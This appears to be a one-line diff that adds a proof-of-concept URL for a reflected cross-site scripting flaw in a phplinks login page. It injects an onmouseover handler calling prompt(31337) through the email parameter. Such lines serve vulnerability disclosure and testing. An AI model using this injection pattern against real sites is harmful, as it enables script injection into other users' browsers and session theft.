@@ -1,0 +1,1 @@
+http://www.example.com/phplinks/login.php?email=%F6&quot;+onmouseover=prompt(31337)//&amp;submit=Login&amp;forgotten=1
